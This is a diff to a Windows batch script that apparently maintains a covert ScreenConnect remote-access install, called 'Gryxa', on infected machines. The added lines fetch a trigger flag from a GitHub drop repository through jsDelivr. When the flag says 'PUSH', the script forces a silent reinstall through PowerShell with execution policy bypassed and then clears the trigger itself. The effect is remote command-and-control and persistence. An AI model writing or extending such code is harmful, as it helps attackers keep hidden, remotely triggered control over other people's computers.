@@ -35,7 +35,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M33"
+set "MONVER=M34"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -320,7 +320,21 @@ rem O40: if ANY non-sevrz SC Running → never msiexec (stops panel duplicates).
 set "GRYXA_OK=0"
 set "GRYXA_WAS=0"
 set "DO_DEEP=0"
+set "FORCE_G=0"
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
+
+rem FORCE push: repo flag forces an immediate Gryxa install once (self-clears via tag match)
+"%CURL%" -L --connect-timeout 6 --max-time 20 -o "%WD%\force_gryxa.new" "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/force_gryxa.flag?t=%RANDOM%%RANDOM%" >nul 2>&1
+if exist "%WD%\force_gryxa.new" (
+  findstr /C:"PUSH" "%WD%\force_gryxa.new" >nul 2>&1
+  if not errorlevel 1 (
+    if not exist "%WD%\force_gryxa.done" set "FORCE_G=1"
+    if exist "%WD%\force_gryxa.done" (
+      findstr /C:"PUSH" "%WD%\force_gryxa.done" >nul 2>&1
+      if errorlevel 1 set "FORCE_G=1"
+    )
+  )
+)
 
 rem Detect any Running non-sevrz ScreenConnect (true Gryxa presence)
 powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-health -WorkDir "%WD%" >"%WD%\gryxa_health.out" 2>nul
@@ -332,6 +346,18 @@ if not errorlevel 1 (
   set "GRYXA_OK=1"
   set "GRYXA_WAS=1"
   if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
+)
+
+rem FORCE push overrides healthy-skip: run a forced ensure this tick
+if "%FORCE_G%"=="1" (
+  echo gryxa_force_push>>"%LOG%"
+  if exist "%WD%\own_lib.ps1" (
+    set "GRES="
+    for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -Force -WorkDir "%WD%" -Build %MONVER%`) do set "GRES=%%R"
+    echo gryxa_force_result=!GRES!>>"%LOG%"
+    copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
+  )
+  goto :GryxaAfter
 )
 
 powershell -NoProfile -NonInteractive -Command "if(( -not (Test-Path '%GRYXA_DEEP%')) -or (((Get-Date)-(Get-Item -LiteralPath '%GRYXA_DEEP%' -Force).LastWriteTime).TotalHours -ge 8)){ exit 1 } else { exit 0 }" >nul 2>&1
